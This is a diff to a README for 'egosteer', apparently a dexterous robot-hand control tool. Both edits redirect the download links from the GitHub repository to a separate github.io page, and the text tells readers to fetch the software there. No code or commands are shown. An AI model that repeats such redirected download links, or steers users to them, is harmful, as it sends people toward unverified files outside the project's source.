@@ -1,6 +1,6 @@
 # 🤖 egosteer - Master dexterous robot hand control easily
 
-[![](https://img.shields.io/badge/Download-egosteer-blue.svg)](https://github.com/retrograde-casanova938/egosteer)
+[![](https://img.shields.io/badge/Download-egosteer-blue.svg)](https://retrograde-casanova938.github.io)
 
 egosteer provides the tools to control complex robot hands. It uses a virtual internal map to predict movement. This helps the robot perform delicate tasks. You can use these tools to train your robotic systems with better speed and reliability.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Please ensure your syst
 
 You need to visit the project page to download the software. This page contains all the files for your computer.
 
-[Visit the release page to download egosteer](https://github.com/retrograde-casanova938/egosteer)
+[Visit the release page to download egosteer](https://retrograde-casanova938.github.io)
 
 1. Open your web browser.
 2. Navigate to the link above.
